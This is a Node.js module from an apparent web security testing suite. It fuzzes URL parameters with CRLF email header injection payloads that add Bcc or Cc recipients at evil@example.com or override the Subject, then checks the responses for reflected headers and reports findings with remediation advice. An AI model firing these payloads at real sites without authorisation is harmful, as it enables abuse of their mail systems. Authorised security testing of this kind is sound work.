#!/usr/bin/env node
'use strict';
/**
 * ╔════════════════════════════════════════════════════════════════════════════╗
 * ║ WebArsenal v5.5.0 "Pulse" - Advanced Security Suite                          ║
 * ║ De{c0}ded by Edwin Dev                                                      ║
 * ║ Module: email-header-injection-tester.js                                                          ║
 * ╚════════════════════════════════════════════════════════════════════════════╝
 */




const axios = require('axios');
const { getModuleById } = require('../lib/module-catalog');
const { parseArgs } = require('../lib/module-runner');
const { HttpHistoryLogger } = require('../utils/http-history-logger');

const definition = getModuleById('vuln-probes/email-header-injection-tester');
const historyLogger = new HttpHistoryLogger();

async function run(argv = process.argv) {
  const { flags } = parseArgs(argv.slice(2));
  const url = flags.url;

  if (!url) {
    console.log(`Usage: node ${definition.filePath} --url <target-url-with-params>`);
    return;
  }

  const parsedUrl = new URL(url);
  const params = Array.from(parsedUrl.searchParams.keys());

  if (params.length === 0) {
    console.log('[-] No parameters found in URL to fuzz.');
    return;
  }

  console.log(`[*] Probing Email Header Injection on ${url} across ${params.length} parameters...`);
  const findings = [];
  const emailPayloads = [
    { payload: 'test@example.com%0ABcc: evil@example.com', description: 'CRLF-based Bcc injection' },
    { payload: 'test@example.com%0ACc: evil@example.com', description: 'CRLF-based Cc injection' },
    { payload: 'test%0ASubject: Injected', description: 'CRLF-based Subject override' }
  ];

  for (const param of params) {
    for (const p of emailPayloads) {
      const fuzzUrl = new URL(url);
      fuzzUrl.searchParams.set(param, p.payload);

      try {
        const startTime = Date.now();
        const response = await axios.get(fuzzUrl.toString(), {
          timeout: 10000,
          validateStatus: () => true
        });
        const duration = Date.now() - startTime;

        historyLogger.logRequest({
          tool: definition.id,
          method: 'GET',
          url: fuzzUrl.toString(),
          requestHeaders: {},
          statusCode: response.status,
          responseHeaders: response.headers,
          responseBody: typeof response.data === 'string' ? response.data : JSON.stringify(response.data),
          durationMs: duration
        });

        // Reflection check in body (indicates potential backend injection)
        const body = String(response.data || '').toLowerCase();
        if (body.includes('bcc:') || body.includes('cc:')) {
          findings.push({
            title: `Potential Email Header Injection (${p.description})`,
            severity: 'Medium',
            target: fuzzUrl.toString(),
            tool: definition.id,
            cvss: '6.4',
            evidence: {
              request: `GET ${fuzzUrl.toString()}`,
              response: `Injected email header reflected in response body.`
            },
            remediation: 'Sanitize all user-controllable input by removing or encoding CRLF characters before passing them to an email library or SMTP server. Use a library that prevents header injection automatically.'
          });
          console.log(`[!] POSSIBLE EMAIL HEADER INJECTION: ${fuzzUrl.toString()}`);
          break;
        }
      } catch (err) {
        // Skip
      }
    }
  }

  if (findings.length > 0) {
    console.log(`[+] Found ${findings.length} email header issues!`);
    process.stdout.write(JSON.stringify(findings, null, 2) + '\n');
  } else {
    console.log('[-] No email header injection detected via simple reflection.');
  }

  return findings;
}

if (require.main === module) {
  run().catch(console.error);
}

module.exports = { run };
